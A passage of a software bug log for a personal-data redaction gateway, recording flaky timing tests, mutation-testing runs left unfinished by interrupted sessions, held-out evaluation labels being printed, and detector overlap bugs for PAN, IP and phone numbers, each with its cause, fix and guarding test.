added two test files and new blocks in four others, all running in
parallel (the streaming no-leak block alone takes about 12 s under
coverage), and the extra load did the rest. `linear-time.ts` already said
"pick `n` so that one run on the small input takes several milliseconds";
for the long units the input was several times larger than that.

**Fix:** `ofLength(unit, chars)` in `test/support/linear-time.ts`, and both
linear-time blocks size their inputs by characters: 80,000 for
`unsafeRegions` (what `](< ` already used) and 50,000 for `restore`. Under
coverage the URL test went from 23.2 s to 3.9 s, and "placeholders in
URLs" from 19.7 s to 2.1 s.

**Guarded by:** the mutation checks that prove these tests catch quadratic
code, re-run on the smaller inputs: B16 (the unsafe-region tests pointed at
the Phase 2 regular expressions) fails 2 of 55 (`](< ` and `[a ` repeated); B17 (the every-bracket filter
brought back) fails 2 of 57 ("brackets and bare forms mixed", "placeholders in URLs").

**Lesson:** "repeat N times" hides how big the input is when the unit's
length varies. A hang guard is not a performance budget: a test that
normally uses 77% of it fails the day the machine is busier.

---

## 20. Timing tests still failed at random: growth ratios over 8, and my own stream timings (2026-09-29, Phase 4b)

**Symptom:** the Phase 4b mutation run executes the whole suite once per
mutation. In 9 of 31 runs, a test the mutation could not affect failed as
well: a growth-ratio linear-time test (in `unsafe-regions`, `restore`,
`number` and `email`), or one of my new stream tests ("time the consumer
takes between reads", "more bytes than the cap in all"). Five plain full
runs afterwards, with nothing mutated: runs 1 to 3 clean, run 4 failed
"keeps going while every gap is shorter than the timeout" (`provider
timeout`), run 5 failed "restore: linear time > placeholders in URLs" with
a ratio of 8.13 against the limit of 8. Nothing was ever sent unredacted;
these were tests that fail at random.

**Root cause, three parts:**

- **The ratio limit had too little headroom.** Sampled with the test's own
  `growthRatio` on the `restore` URL shape (2026-09-30, dev machine): at
  50,000 / 100,000 / 135,000 characters, idle, 38 samples each, medians
  4.26 / 4.68 / 5.13 and maxima 6.37 / 6.31 / 7.00; with the full suite
  running at the same time, 14 samples each, maxima 5.73 / 7.09 / 7.51. The
  median is about 4.5, not 4, and the tail reaches past 7, so 8 is only
  about 1.6 times the median. A larger input did not calm it (135,000 had
  the widest spread), so bug 19's smaller inputs were not the cause.
- **My stream tests had tight timings.** A 60 ms gap against a 150 ms
  timeout, a 100 ms timeout for a whole request, a connection destroyed
  20 ms after the first write. A busy machine stretches any of them.
- **Two size-cap tests assumed where the cap trips.** If the mock's first
  chunk and the rest reach the adapter in one network read, that read is
  already over the cap, so `stream()` rejects (an HTTP 502) instead of the
  events throwing (an error event). Both are correct, and production has
  the same nondeterminism; the tests accepted only one.

**Fix:**

- `growthRatio` measures again while the ratio is at or over the limit,
  up to `MEASUREMENTS` = 3 times, and keeps the smallest. Load can only
  push a ratio up, so the smallest is the truest; linear code clears the
  limit on a second try, quadratic code is about 16 every time. The extra
  measurements cost nothing unless the first looks bad; on genuinely
  quadratic code they triple the time the failing test takes.
  `test/unit/support/linear-time.test.ts` scripts `performance.now` to
  check it measures once when fine, again when not, gives up after three,
  and still fails a real quadratic function.
- Stream timings with wide margins: gaps a tenth of the timeout (50 ms
  against 500 ms, 15 writes), a 300 ms timeout with the consumer sleeping
  450 ms, gap tests at 300 to 400 ms, a connection cut 150 ms after the
  first write.
- The size-cap tests (adapter, endpoint, canary) accept either ending and
  check the same failure: `too_large` in the adapter, and exactly the same
  `provider_response_too_large` body as a 502 or as the error event.

**Guarded by:** B16 and B17 re-run on the new `growthRatio` (testing
guide): both still caught, B16 failing 2 of 55 (in 14.5 minutes: each quadratic shape is now measured three times) and B17 2 of 57. Then 8 consecutive full runs, 1,210 of 1,210 green each time, and a green coverage run. The helper's own quadratic test first took 38.7 s under coverage (n = 2,000, measured three times, over the 30 s guard); it now uses n = 1,000 and 3 repeats: 0.2 to 0.3 s plain, 2.0 s under coverage.

**Lesson:** bug 9 made timing tests immune to _slow_ machines, not to
_noisy_ ones: a best-of-5 ratio still has a tail, and a limit should be
set from its measured distribution, not from the ideal value. And a test
that says "this fails mid-stream" has to control where the bytes break,
or accept that it cannot.

---

## 21. A `beforeAll` ran under Vitest's 10 s hook limit while tests had 30 s (2026-09-30, after Phase 4b)

**Symptom:** the first full run after the stream-cap change reported
`Test Files 1 failed | 41 passed (42)` and `Tests 1215 passed | 4 skipped
(1219)`: a failed file with no failed test. I had piped the run through
`tail`, so the error text was lost. It did not happen again in 19 further
full runs that day. Nothing was ever sent unredacted; it was a test file
that can fail at random.

**Root cause (what is shown, and what is not):**

- _Which hook._ Four skipped tests and a failed file mean a `beforeAll`
  failed in a block of four. The only such block is the first one in
  `test/integration/no-leak.test.ts`. Run with `--hookTimeout=1000`, the
  suite gives the same output three times out of three: `Failed Suites 1`,
  `no-leak: nothing planted reaches the provider`, `Hook timed out in
1000ms`, `1 failed` file, `4 skipped`, no failed test, and nothing else
  in the suite fails.
- _Why that hook is slow._ It calls `startTestGateway()`, and the first
  `Fastify()` in a process loads its parts lazily: 276 CommonJS modules,
  1.3 to 1.5 s for the first instance against 3 to 34 ms for the second
  (measured in a fresh Node process). In a full run 42 workers start at
  once and compete for the disk and the CPU. Measured inside full runs
  (timings only, instrumentation removed afterwards): 0.46 to 1.08 s under
  coverage (4 runs), 0.43 to 2.80 s plain (4 runs), and 1.8 to 5.6 s with
  two other suites plus lint and typecheck running (12 samples). The other
  two files that build a gateway do it inside a test, under the 30 s
  `testTimeout`. Only this one does it in a hook, and `hookTimeout` was
  still Vitest's default of 10 s: bug 9 raised the limit for tests and
  left hooks behind.
- _Not shown:_ the hook itself taking more than 10 s. The slowest I
  measured was 5.6 s, 56% of the limit, under deliberate load. The failing
  run was the slowest plain run of the day (32.9 s against about 26 s,
  with 32% of its time in imports against 9 to 17%), which fits a
  cold-disk start, but its error text is gone. So the cause is
  established by elimination and mechanism, not by the original message.
- _A first guess,_ that the streaming no-leak block's 12 s of
  tests ran into the 10 s limit, is not it: `hookTimeout` covers hooks
  only, and that block's own `beforeAll` takes 9 to 63 ms because the
  first block has already paid for loading Fastify.

**Fix:** `hookTimeout: 30_000` in `vitest.config.ts`, the same guard as
`testTimeout`, with the reason in a comment. And a working rule: a test
run's whole output goes to a file before it is shortened, so a failure is
never lost again.

**Guarded by:** nothing can assert "this will not time out"; what there is
instead: the measurement above (the hook now uses at most 19% of its
limit under the heaviest load I produced), and 5 full runs with the new
limit, all clean (the wiring mutation runs, each failing only the tests
its mutation should).

**Also seen while measuring, not fixed:** with three full suites plus lint
and typecheck running at once, the growth-ratio tests fail often (9 of 18
such runs failed 1 to 4 of them, ratios of 8.1 to 16.6 against the limit of
8; no other test failed), and the two long no-leak tests took up to 20 s and 24 s of their 30 s.
That is a load I created on purpose, several times an ordinary run. It
matters if the suite is ever run in parallel with itself or on a heavily
shared CI runner; to be looked at when CI is set up (Phase 8).

**Lesson:** a limit raised for one kind of thing (tests) has a sibling
(hooks). And never pipe a test run into `tail`: the one line that matters
is the one that scrolls away.

## 22. The evaluation printed the held-out set's own words: lookalike labels and tag names (2026-09-30, before Phase 5b)

**Symptom:** none that a test showed. Before starting 5b the user asked me
to confirm that no lint, evaluation or test output ever prints the text of
held-out cases, "only ids, line numbers, rule names and counts". Reading
every output path, I could not confirm it. Two things that are text from
`eval/held-out.txt` were printed by default:

- the **labels of `NOT` slots** (`{{NOT.order:…}}`): `npm run eval` printed
  the held-out over-redaction table with one row per label, on every run,
  the first measurement included;
- **tag names**: `npm run eval:lint` printed "cases by tag: name count, …",
  and `--by-tag` printed results per tag.

No line of any message was ever printed; that part held.

**Root cause:** "never text" had been read as "never message text". The
header comment of `eval/run.ts` said "for the held-out set it prints
counts, never text", and the testing guide said `--by-tag` "prints counts
only", while the code printed whatever label or tag the file's author had
typed. A label is a word chosen by the person who wrote the case, and a
row such as "NOT.x: 2 over-redactions" says which kind of held-out case
the detectors get wrong. That is exactly what the session working on the
detectors must not learn. The report code was shared with the generated
set, where labels are the generator's own and are fine to show, and
nothing made the two cases differ.

**What it cost:** whoever ran the first held-out measurement saw the labels
of the over-redacted held-out lookalikes (5 detections: PHONE 1, NUMBER 4).
No label is recorded in any file I can read, and nothing was tuned between
that run and this fix: the first detector change after it is this phase's.

**Fix:** `overRedactionTable(score, 'hidden')` folds every `NOT.*` row
into one `lookalike` row; `eval/run.ts` uses it for the held-out set.
`eval/check-held-out.ts` prints the number of distinct tags. The author's
view is still there behind flags that whoever works on the detectors does
not use: `--by-tag` (`run.ts`), `--tags` and `--show ID`
(`check-held-out.ts`). Comments, `HELD-OUT-FORMAT.md`, the testing guide
and ADR-021 now say what is printed, per output.

**Guarded by:** `report.test.ts`, "with labels hidden, every lookalike is
one row and no label is printed" (mutation P1: 1 test fails). Not under
test: that `run.ts` passes `'hidden'` and that `check-held-out.ts` hides
the tag names, because the two entry points are wiring outside the test
suite; both were checked by running them.

**Lesson:** "prints no text" is a claim about every string that comes out
of a file, not about the field called `text`. When a rule says what may be
printed, list the outputs and check each against it; a comment that states
the rule is not a check.

## 23. The no-leak test timed out at 30 s in a full run under coverage (2026-09-30, Phase 5b)

**Symptom:** the first full run with coverage after the secret detector
went in: `Test Files 1 failed | 53 passed`, `Tests 1 failed | 1790
passed`. The failure was `no-leak: nothing planted reaches the provider >
sends every history, and no planted value in any form`, `Error: Test timed
out in 30000ms`. The whole file took 74.4 s in that run. The same test
passed in the plain full run just before it and in the next run under
coverage (13.3 s for the test). Nothing was sent unredacted: the test did
not reach its verdict.

**Root cause (measured):** the test was slow for a reason that had nothing
to do with what it proves, which left it one loaded moment away from its
limit. Alone and without coverage it took 4.26 s. Most of that was not the
gateway: for each planted value, `leakedForm()` normalised the whole
captured request twice (once for the `normalised` form, once inside
`squash`), and the captured text is the same for every value of a history.
About 740 values against about 90 captured texts meant about 1,500
normalisations of a 1 to 3 KB text where 180 would do. Redacting the
messages, the thing under test, is a small part (a history of 12 values:
16 to 31 ms to redact, 37 to 45 ms to check, first calls included). Under
coverage every one of those calls is instrumented, and the suite's
linear-time tests compete for the same cores (this phase added 17 of
them). The status note after bug 21 had already recorded this test at
20 to 24 s of its 30 s under deliberate load.

Not shown: that the secret detector made it slower. Detection of a message
with a disguised key takes 0.2 to 1.1 ms; the detector's own share is
about 0.1 ms.

**Fix:** `test/support/leak-check.ts` works out the lower-cased,
normalised and squashed forms of a captured text once and reuses them
while the same text is asked about. The test now takes 0.66 to 0.71 s
alone (3 runs), a sixth of before, with the same checks on the same
values.

**Guarded by:** `leak-check.test.ts`, "judges each captured text on its
own, in any order of calls": the remembered forms must never answer for a
different text (mutation L1, where the first text is kept for ever, fails
it). The time itself has no assertion; the measurement is above.

**Lesson:** the expensive part of a test may be the checking, not the code
under test. Time the pieces before blaming the machine, and before raising
a limit.

## 24. A mutation check never ended and left a mutated source file behind (2026-09-30, Phase 5b)

**Symptom:** the session running the Phase 5b mutation checks was cut off
by a usage limit while they ran in the background. The next `npm test`,
run by the user: `4 test files failed`, `24 tests failed`, 1,737 passed of
1,799, and 38 tests never reported. Nothing had been committed, so nothing
wrong was published, but the working tree no longer held the code that
had been written.

**What was found (next session, before changing anything):**

- `src/detection/number.ts` differed from its intended text by one line:
  `for (…; false && to < ceiling && TOKEN_CHAR.test(ch);)`. That is
  mutation N2, "the safety net does not widen forwards". The six other
  files the mutations touch were byte-identical to the snapshot taken
  before the run.
- The runner's backup file (`MUTATION-IN-PROGRESS.json`) was still there,
  written at 17:53:19, one millisecond before the file's own timestamp.
- The runner and its test run were **still alive** two and a half hours
  later. The Vitest worker had used 8,638 seconds of CPU. It was not
  waiting; it was computing.

**Root cause:** two things, neither enough alone.

1. _The mutant is quadratic, and the test that exists to catch that
   cannot say so in any useful time._ Without forward widening, a digit
   stretch inside a long token is no longer inside the previous detection,
   so each stretch walks back to the start of the token. The test "runs in
   linear time on one long token full of long numbers" feeds
   `unclaimedNumbers` a 250,000-character token (25,000 stretches) and one
   four times as long. `growthRatio` runs the work on both sizes at least
   five times each, plus a warm-up, before it returns a number to assert
   on. For linear code that is milliseconds. For this mutant it is hours:
   the input is sized for the code being right. Measured afterwards on a
   copy outside the repo: 14 ms at 2,000 characters, 207 ms at 8,000,
   3.99 s at 32,000 (growth 14.6 and 19.3 for four times the input, where
   the code as written gives 3.9 and 4.1). At that rate one run on the
   test's large input takes about 65 minutes. Vitest's 30 s `testTimeout`
   cannot help, because the work is one synchronous call and a timeout
   cannot interrupt it.
2. _The runner waited without a limit._ It ran the tests with
   `spawnSync` and put the file back in a `finally`. That is correct as
   long as the test run returns. It never did, so the `finally` never
   ran, and when the session ended there was nobody left to notice.

Reproduced with a time limit: N2 against the whole suite reports 1,761
tests (1,737 passed, 24 failed), finishes 53 of 54 files, and then sits in
`number.test.ts` on that one test until it is stopped. 1,799 − 1,761 = 38:
the stuck test and the 37 after it in the file. Vitest counted 4 failed
files because the fifth never finished. The 24 failures are N2's own
(19 in `number.test.ts`, 2 in `secret.test.ts`, 1 each in the phone, card
and Aadhaar tests); none came from unfinished work.

**Also wrong:** the handover said "15 of 53 done, all caught so far". The
logs said 36 done and **three survivors** (S25, S26, S28, each `0 of 498
failed`). The run's results had been written to a file that nobody had
read to the end.

**Fix:**

- `number.ts` put back from the runner's own backup and checked
  byte-for-byte against both the backup and the snapshot; the full suite
  then passed (1,799 of 1,799). The runner and its test run were stopped,
  runner first: had the test run ended first, the runner would have gone
  on to the next mutation.
- A new runner (kept outside the repo, like the old one): **a time limit
  per mutation** (15 minutes), after which the whole process tree of the
  test run is stopped and the result reads "stopped after 15 minutes with
  N tests already failed"; results written **test by test** by a small
  Vitest reporter (names and states, never a failure message), so a
  stopped run still has counts; the file is put back in `finally`, on
  SIGINT/SIGTERM and on exit, and compared with the original afterwards;
  it refuses to start while a backup of an unfinished mutation exists.
- The three survivors got tests (see the testing guide): the "whole word"
  rule on both sides of a keyword, and a keyword with an identifier tail.

**Guarded by:** no test in the repo: the runner is a tool, not product
code. Its stop path was exercised before it was trusted (a 6-second limit
on a normal mutation: stopped, partial counts, file identical, no process
left), and then by N2 itself at the real limit.

**Also seen in the re-run (52 mutations, one at a time, 15-minute limit):**

- Three more mutations have the same shape and were stopped at the limit:
  S21, N5 and N6. N2 and N6 had already failed other tests (24 and 1).
  S21 and N5 had failed none, so this run does not show them caught. S21
  does fail two timing tests when left alone for 24.5 minutes (the first
  run). N5 changes no result at all (0 of 300,000 random inputs), so
  nothing but a timing test can catch it.
- A busy machine gave a false "caught". N7, N8 and N9 ran while the
  machine was doing other work, took 9 to 12 minutes each instead of half
  a minute, and reported 10, 6 and 8 failed tests. N9's 8 were all timing
  and property tests with nothing to do with the mutation; on a quiet
  machine N9 fails **0 of 502**. It is an equivalent mutation (0 of
  300,000 random inputs differ), so the true result is "survives, and
  cannot be caught". The three rows in the testing guide are the quiet
  re-run.

**Not fixed, proposed for 5d** (with the other timing-test work, before
CI): `growthRatio` cannot fail fast. The ratio it looks for is already
there at 8,000 characters in a fifth of a second; the tests measure at
250,000 and 1,000,000. A real quadratic regression in any
code with a linear-time test would show up as a test run that hangs for
hours, in CI as a job that runs into its time limit, and not as a failed
assertion naming the test. The fix is to climb to the full size from a
small one and stop at the first size where the ratio is measurable and
already too high. It changes how every timing test measures, so it needs
its own stability runs.

**Fixed 2026-10-01** (before UPI, own `test:` commit; ADR-023):
`growthRatio` climbs through n / 4^k up to `n` and 4n, judges a step once
its smaller input takes 2 ms, and stops at the first judged step that stays
at or over 8 after up to three measurements. Re-run with the same runner
and limit, the four mutations are now caught, each by its timing test by
name: S21 in 32 s (2 of 502, both "keywords chained by colons" timing
tests), N2 in 42 s (26: the same 24, its timing test, and a test after it that
never ran before), N5 in
80 s (1: its timing test; never seen to fail anything before), N6 in 52 s
(2: the merge test plus its timing test). Stability: 8 consecutive full
runs and 2 under coverage, 1,808 of 1,808 green each time. The helper's
own tests script the clock for each climbing rule and give a real
quadratic function n = 1,000,000 (2.5 to 3.3 s to fail); 5 mutations of
the helper, all caught.

**Happened again 2026-10-01 (Phase 5b IP); safeguard added.**

_Symptom:_ the session building the IP detector was cut off by a usage
limit while the IP mutation checks ran in the background. The user's next
`npm test`: 2 files failed, 5 tests failed, 2,112 passed of 2,117. Four
were in `ip.test.ts` (an address glued to a following letter, to
`@example.com`, inside `10.1.2.3.nip.io`, and the first six characters
of the CSS selector `a::before`, all accepted); the fifth was
`repo-hygiene` reporting a public IP address at `ip.test.ts:236`, which is
that same `a::before` line: read without the glue check, those six
characters are an IPv6 address with a
three-digit group, so validated and public.

_What was found (next session, before changing anything):_ no `node`
process alive. The runner's marker was still in the old session's
scratchpad, written 08:47:54, the same second as `src/detection/ip.ts`.
The file differed from the marker's original by exactly one line,
`const gluedAfter = false;`: mutation I6, "glue after is ignored". Every
other `find` text of the 52 IP mutations occurred exactly once, so no
other mutation was left; the 30 September marker for `number.ts` still
matched its file. The results log showed I1 and I2 "stopped after 15
minutes" in 2,811 s and 13,277 s (I2 had not reported a single test), then
I3 to I5 finishing normally from 08:47, and I6's last test reported at
08:50:43. The overrun fits the machine sleeping between about 04:20 and
08:46 with the runner's one `setTimeout` firing only after it woke; the
kill during I6 fits the old session's background tasks being ended when
the new sessions started at 08:53. Neither is proven.

_Root cause:_ the first fix covered a run that hangs, not a process that
is killed. The runner puts the file back in `finally`, on signals and on
exit, and none of those runs when its process tree is killed outright. Its
marker was in its own session's scratchpad, where nothing else ever looks:
each session wrote its own runner in its own scratchpad, and no test run
or evaluation knew a marker could exist. The working rule "after an
interrupted session, check for `MUTATION-IN-PROGRESS.json`" depended on
someone remembering to look, in the right scratchpad.

_Fix:_ `ip.ts` put back from the marker's backup, after checking the
current file was exactly the I6 mutant; the full suite then passed, 2,117
of 2,117. Then the safeguard, so a killed run can no longer go unnoticed:

- The runner is now in the repo: `scripts/mutate.ts` (with
  `scripts/mutation-reporter.ts`). Mutation lists and results still live
  outside it.
- Before writing a mutation it writes `.mutation-in-progress.json` at the
  **repo root** (gitignored, dockerignored; `scripts/mutation-marker.ts`):
  the file's original and mutated text, the mutation's id, the start time,
  the runner's process id and a fresh run id.
- **Every test run refuses to start while the marker exists**: a Vitest
  `globalSetup` (`test/support/mutation-guard.ts`) throws before any test
  file loads, naming the mutation and the file and saying how to restore.
  **`eval/run.ts` refuses too**, so a mutated detector can never be
  measured or written into the baseline by `--update`. The only test runs
  allowed are the runner's own, which carry the marker's run id in
  `PSEUDONYM_MUTATION_ID`. A second runner refuses as before.
- `npx tsx scripts/mutate.ts --restore` puts the file back only if it is
  exactly the mutant (a file edited since is left alone, marker and all),
  and refuses while the process that wrote the marker is still alive.
- The time limit is checked against the wall clock every 2 s instead of
  one `setTimeout`, so a run that outlived it is stopped as soon as the
  runner runs again.

_Guarded by:_ `test/unit/scripts/mutation-marker.test.ts` (8 tests: no
marker, refusal text, the runner's own id and only that one, restore of a
mutant, of an original, and of a file edited since). Exercised end to end
on the real `ip.ts` before it was trusted: I6 started and its process tree
killed with `taskkill /T /F` two seconds in left the marker and the mutant
behind, exactly as here; `npx vitest run` then stopped in global setup
(exit 1), `npx tsx eval/run.ts --update` refused (exit 2), a second runner
refused; `--restore` put `ip.ts` back, identical to the backup; and
`--restore` during a live run refused, naming the process. Known gaps:
Vitest prints "No test files found" above the refusal (the exit code and
the error are right); a file mutated by anything other than this runner,
or a marker deleted by hand, is not covered.

**Lesson:** a tool that edits source code must be able to put it back
without depending on the thing it is waiting for. **And the evidence that
it has not yet done so must sit where every later process looks**, not
where the process that may die keeps it. And after an interrupted
session, the first question is "what did the last process leave behind",
asked of the process list and the working tree, before any test result is
believed.

## 25. The fail-fast test could itself take minutes to fail (2026-10-01, before 5b UPI)

**Symptom:** proving the new climbing `growthRatio` (ADR-023) with
mutations of the helper itself. Mutation F3, "a judged step never stops the
climb", was caught (2 of 10 tests failed) but took 727 s, where the other
four took 1 to 6 s. Nothing was sent unredacted; it was a test that would
have hung for minutes on exactly the regression it exists to catch.

**Root cause:** the test "fails quadratic work in seconds at a size it
could never finish" gives a quadratic function n = 1,000,000 and a `make`
that throws above a size, so that a helper which does not climb fails at
once. I set that limit at 250,000, a quarter of `n`, without working out
what the quadratic function costs there. A correct climb stops at 3,906 →
15,625 characters (15 ms, then 250 ms). A climb that does not stop goes on
to 62,500 → 250,000, where one run takes about a minute, and measures it
three times with three repeats before `make` refuses the next size. The
scripted test for the same rule failed in milliseconds, so the mutation
was caught either way; this test was just slow at it.

**Fix:** the limit is 62,500. Only a machine more than 16 times faster than
this one would need that size for a correct climb, so the headroom is
still wide; the comment says why the number is what it is.

**Guarded by:** F3 re-run: 2 of 10 failed in 70 s (the scripted test at
once, this one after its three measurements at 15,625 → 62,500). F1, F2,
F4 and F5 unchanged: caught in 2 to 5 s.

**Lesson:** a guard against "too slow" needs its own cost worked out: a
limit picked as "a quarter of n" was four times too large, which for
quadratic work is sixteen times too slow.

## 26. A UPI ID at a known handle typed into a test file (2026-10-01, Phase 5b UPI)

**Symptom:** the new repo-hygiene check "contains no UPI ID at a known
handle" failed on its first run, naming two lines of
`test/unit/detection/upi.test.ts`. Both were inputs for linear-time
tests: a one-letter name at PhonePe's handle, repeated. Nothing was sent
or committed.

**Root cause:** ADR-021 says UPI IDs are never typed into a file, because
one at a real handle could be somebody's; the rest of the test file
builds every ID at run time from a generated name. For the timing inputs
I thought only about what makes the regex work hard and reached for the
first handle I knew, so a known-handle ID ended up in the file. The same
kind of slip as bug 4 (a valid-looking Aadhaar in a comment), with the
same kind of guard catching it.

**Fix:** the two timing inputs use a handle on no list (`zzq`). Their
speed does not depend on whether the handle is known: the only extra work
for a known one is a set lookup.

**Guarded by:** `repo-hygiene.test.ts`, "contains no UPI ID at a known
handle" (runs the UPI detector over every line of every scanned file and
reports file and line only), plus "the UPI check flags an ID put
together at run time", which shows the check can fail.

**Lesson:** the rule "no typed values" applies to inputs written for the
machine (timing strings, fuzz seeds) as much as to realistic examples;
those are the ones written without thinking of them as data.

## 27. A PAN glued to "@" won over the email and the domain was sent (2026-10-01, Phase 5b IFSC)

**Symptom:** while probing how an IFSC-shaped code would overlap other
types, I ran the existing detectors on a generated PAN used as an email
local part. `detect("<PAN>@example.com")` returned one detection, a
validated PAN over the ten letters and digits; `@example.com` was left
in the text that goes to the provider. The same for `x.<PAN>@example.com`
(the `x.` and the domain sent) and `<pan>@<known UPI handle>` (the handle
sent). No test, no dataset case and no no-leak sentence had a PAN inside
an address, so nothing had failed.

**Root cause:** ADR-003's rule 1, a validated detection beats a longer
unvalidated one, and every email is unvalidated. Phase 1b raised exactly
this concern and answered it at the detector level: digits glued to `@`
belong to the email (`GLUED_BEFORE`/`GLUED_AFTER` in `digit-runs.ts`).
That answer was written into the digit detectors only. The PAN detector,
the one detector made of letters and digits, kept its own "not glued"
class without `@`, and nobody asked whether the rule applied to it too.

**Fix:** `PAN_PATTERN` treats `@` as glue on both sides, like the digit
detectors. A PAN-shaped local part is now the email's (or the UPI ID's),
covered whole. The IFSC detector, written the same day, has the rule from
the start. No evaluation count moved (neither dataset has a PAN inside an
address).

**Not fixed (ADR-003 containing span, 5c):** `<PAN>.x@example.com`. The
PAN is not glued to `@`, it is validated, and it still wins over the
longer email, so `.x@example.com` is sent. Phones do the same today
(`<mobile>.x@example.com`, probed the same day), and so will IFSC. That is
the general "should a containing span win?" question, which is 5c's;
pinned by a known-limit test.

**Guarded by:** `pan.test.ts`, "a PAN glued to "@" is part of the address:
the email or UPI ID is covered whole" (a property over generated PANs;
failed before the fix, counterexample hidden), "a PAN right after "@" is
part of the address: a domain label or a UPI handle" (added when mutation
P1, the "@" before a PAN, survived the first test: every address in it
had the PAN before its "@"), and the known-limit test next to them.

**Lesson:** a rule decided for "digits" was really a rule about "any
value inside an address". When a concern is answered in one detector, the
answer should be written down as a property of all of them, or the next
detector that has the same shape will not inherit it.

## 28. A new linear-time test ran past the 30 s limit under coverage (2026-10-01, Phase 5b IFSC)

**Symptom:** the first full run under coverage after the IFSC detector
went in failed one test, "IFSC: linear time > scans letters and zeros in
linear time", with "Test timed out in 30000ms" after 37.7 s (1 failed,
1,933 passed). The same test had passed on its own without coverage.

**Root cause:** not a quadratic detector. Timed outside Vitest,
`detect()` on `"SBIN0"` repeated grows linearly (94, 237 and 803 ms for
6,250, 25,000 and 100,000 characters), but it is expensive: 637 of the
803 ms are libphonenumber scanning a text full of letter-zero pairs,
several times the cost per character of my other inputs (17–35 ms at
25,000). `test/support/linear-time.ts` says to size `n` so one run takes a
few milliseconds; I gave every input the same 25,000, where this one takes
about 140–240 ms a run. With the fastest-of-several runs, the climb, and
up to three measurements of a step, plus coverage instrumentation, that is
more than 30 s. The same mistake as bug 19 (a test sized by habit, not by
what one run costs).

**Fix:** each input in `ifsc.test.ts` gets its own size: 2,000 for
`"SBIN0"` repeated (about 7 ms a run), 25,000 for the other three. A
comment says why.

**Guarded by:** the next full runs under coverage (below); the test itself
is still the guard for the IFSC pattern's speed. Its ability to fail is
checked by the mutation that makes the IFSC scan quadratic (testing guide).

**Lesson:** time one run of a new timing input before choosing its size;
the helper's rule ("a few milliseconds") is about the input, not the file.

## 29. A scratch diagnostic printed part of a generated key (2026-10-01, Phase 5b IP)

**Symptom:** while measuring which IP lookalikes the new detector took, I
ran a throwaway script over the generated set that printed, for each
over-redaction, the 45 characters before the lookalike with every digit
replaced by `#`. One line held the start of a generated AWS-shaped key
from a neighbouring sentence, letters intact. It went to my terminal
only, not to a file, a log or a commit; the key was synthetic, made in
memory from the seed. It still broke ADR-009: generated values are never
printed.

**Root cause:** the mask was written for the value I was looking at (a
number), not for what a context window can contain. Forty-five
characters before a lookalike can hold any other planted value, and a
key is mostly letters. Masking digits only is the same mistake as bug
10's, in a script no test looks at.

**Fix:** every later diagnostic in the session printed case ids, labels,
layouts, detection types and offsets relative to the label, never text.
The scripts were deleted from the working tree before any commit.

**Guarded by:** nothing automated: scratch scripts are not tested. A
working rule instead (below), the same one bug 22 set for the eval tools.

**Lesson:** a diagnostic prints structure (ids, labels, types, offsets),
not text. Masking is not a safe middle way: it has to know every shape a
value can take, and a context window can hold any of them.

## 30. The IP detector's first timing test ran past 30 s (2026-10-01, Phase 5b IP)

**Symptom:** the first run of `ip.test.ts` failed "scans a long run of
digits and dots in linear time" with "Test timed out in 30000ms" after
39.3 s. The IP detector finds nothing in that input.

**Root cause:** bug 28 again. I gave six new timing inputs the same
25,000 characters by habit. Timed on their own, `detect()` on `"1."`
repeated is linear (38, 181 and 806 ms for 2,000, 8,000 and 32,000
characters) but costs about 25 ms per 1,000 characters, all of it
libphonenumber reading thousands of one-digit groups. At 25,000 that is
about 590 ms a run, and the climb with repeats passes 30 s. The lesson
of bug 28 was written down as "time one run first", and I did not.

**Fix:** every input was timed first (1,000, 4,000 and 25,000 characters)
and sized from that: 500 for the two phone-heavy inputs, 1,000 for
addresses after version words and for kept addresses, 25,000 for the
rest. Because a slow phone detector could hide a quadratic IP detector on
small inputs, the IP detector is also timed on its own at 100,000
characters for the three IP-heavy inputs (about 6 ms a run). A comment in
the test says all this.

**Guarded by:** the timing tests themselves; mutation V5 (the version
check reading everything before an address, quadratic) shows they can
fail (testing guide).

**Lesson:** a lesson that lives only in the bug log is not applied.
Measuring one run of a timing input now comes before writing its size,
every time; the step is in the testing guide's checklist for new
detectors.

## 31. The first IP design let a phone number next to an address go unredacted (2026-10-01, Phase 5b IP)

**Symptom:** two probes, before any IP test was written, each sent a
mobile number in the clear. (1) `<netmask> <mobile>`: nothing detected.
(2) `mobile <address> <mobile>` (a phone keyword nearby): only the address
detected. Both mobiles are found on their own.

**Root cause:** two decisions of mine, each reasonable alone, broke the
rule that the loser of an overlap is covered by the winner's widening.
libphonenumber reads a digit before a spaced mobile as part of it
(`0 <mobile>`, `3 <mobile>`), so its match starts inside the address.
(1) Addresses no single host owns (netmasks, loopback) were first made
into validated IP candidates that took part in overlap resolution, so
that no other type could claim them under a wrong name. The phone
reading `0 <mobile>` tied with the netmask (both validated, same length),
IP won on priority, and the kept netmask was then dropped: nothing was
redacted. (2) IP detections were exempted from widening to digit runs,
to stop `IPv4 203.0.113.5` from taking the `4`. But widening is what
covers the rest of a loser that starts inside the winner: without it the
address won and `<mobile>` was left outside every detection.

**Fix:** (1) kept addresses take no part in overlap resolution. After
it, a detection whose span is exactly a kept address is dropped, and a
kept address no detection touches is held back from the safety net; a
detection that reaches past the address stays. (2) IP detections are
widened like every other type, except over a first digit group glued to
a letter (`widenAddress` in `detect.ts`), which is part of a word and
still the safety net's if it is long enough.

**Guarded by:** `ip.test.ts`: "a kept address never costs a neighbour its
detection…" and "PHONE: a phone reading that starts inside an address is
covered by the widened address" (generated mobiles, offsets only).
Mutations P3 (IP not widened) and P6 (kept addresses in resolution) are
caught by them (testing guide).

**Lesson:** ADR-010's "widen after resolving" is not a detail of the
digit detectors; it is what makes a lost overlap safe. Any type that
opts out of it, or any claim that wins without being redacted, needs an
argument for the loser's text, not just for its own.

## 32. A spaced mobile after a lone digit is not detected (2026-10-01, found in Phase 5b IP, fixed in Phase 5c item 1 with bug 34)

**Symptom:** found while writing the tests for bug 31: `Room 3 <mobile>`,
`item 1 <mobile>` and `curl 127.0.0.1 <mobile>` (a mobile written 5 + 5,
after a digit and a space) give no detection at all. With a phone keyword
nearby the mobile is redacted. The detectors as committed before this
phase behave the same; the IP detector did not cause it.

**Root cause:** libphonenumber reads `<digit> <mobile>` as one 11-digit
number, which is not valid, and does not report the 10-digit mobile
inside it. The VALID pass therefore finds nothing, and the POSSIBLE
pass's unvalidated candidate is accepted only with a keyword (ADR-010).
The safety net does not join digit groups across spaces (ADR-011), so it
sees 1 + 5 + 5 digits.

**Fix:** recorded for 5c at first; bug 34 showed it was one case of a
wider gap, and both are fixed by ADR-027 (`spaced-mobile.ts`).

**Guarded by:** the known-limit test in `phone.test.ts` failed when the
fix went in, as it was written to, and now asserts the opposite ("a
